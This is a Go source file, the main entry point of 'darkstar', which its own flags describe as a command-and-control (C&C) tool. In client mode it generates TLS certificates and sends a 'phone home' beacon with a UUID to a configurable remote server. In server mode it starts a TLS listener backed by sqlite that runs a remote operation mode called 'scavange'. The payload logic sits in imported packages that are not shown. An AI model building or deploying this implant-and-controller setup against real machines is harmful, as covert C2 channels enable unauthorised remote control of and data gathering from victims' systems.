package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/AlexsJones/darkstar/net/client"
	"github.com/AlexsJones/darkstar/net/data/message"
	"github.com/AlexsJones/darkstar/net/server"
	"github.com/AlexsJones/darkstar/tls"
	"github.com/gogo/protobuf/proto"
	"github.com/jinzhu/gorm"
	_ "github.com/jinzhu/gorm/dialects/sqlite"
	uuid "github.com/nu7hatch/gouuid"
)

func main() {
	var mode = flag.String("mode", "server", "Darkstar run mode")
	var clientPort = flag.Int("clientport", 8080, "Client port")
	var serverHostAddress = flag.String("serverhostaddress", "0.0.0.0", "Remote darkstar server address")
	var serverPort = flag.Int("serverport", 8080, "Server port")
	var serverMode = flag.String("servermode", "scavange", "Sets the remote C&C operation")
	var serverpath = flag.String("serverdbpath", "darkstar.db", "Set the sqlite3 database")
	flag.Parse()

	switch *mode {
	case "client":

		tlsConfiguration := &tls.Configuration{Host: "", ValidFrom: "", ValidFor: 365 * 24 * time.Hour, IsCA: false,
			RSABits: 2048, EcdsaCurve: "", CertPath: "client.pem", KeyPath: "client.key"}

		if err := tls.GenerateCertificates(tlsConfiguration); err != nil {
			os.Exit(1)
		}

		//Create the initial phone home message------------------------------------
		message := &message.Message{}
		u, err := uuid.NewV4()
		if err != nil {
			log.Fatal(err)
		}
		message.UUID = u.String()

		out, err := proto.Marshal(message)
		if err != nil {
			log.Printf(err.Error())
			os.Exit(1)
		}
		//--------------------------------------------------------------------------
		config := &client.Configuration{Message: string(out),
			Address: *serverHostAddress, CertPath: tlsConfiguration.CertPath, KeyPath: tlsConfiguration.KeyPath, Port: *clientPort}
		client.Send(config)
	default:
		// Connect to database ----------------------------------------------------
		db, err := gorm.Open("sqlite3", *serverpath)
		if err != nil {
			fmt.Println(err.Error())
			os.Exit(1)
		}
		defer db.Close()
		// ------------------------------------------------------------------------
		// tls generate certs -----------------------------------------------------
		tlsConfiguration := &tls.Configuration{Host: "", ValidFrom: "", ValidFor: 365 * 24 * time.Hour, IsCA: false,
			RSABits: 2048, EcdsaCurve: "", CertPath: "server.pem", KeyPath: "server.key"}

		if err := tls.GenerateCertificates(tlsConfiguration); err != nil {
			os.Exit(1)
		}
		// ------------------------------------------------------------------------
		conf := &server.Configuration{Address: "0.0.0.0", CertPath: tlsConfiguration.CertPath, KeyPath: tlsConfiguration.KeyPath,
			Port:          *serverPort,
			ClientHandler: server.ClientHandler,
			Mode:          *serverMode,
			Database:      db,
		}
		if err := server.Start(conf); err != nil {
			log.Printf(err.Error())
		}
	}
}
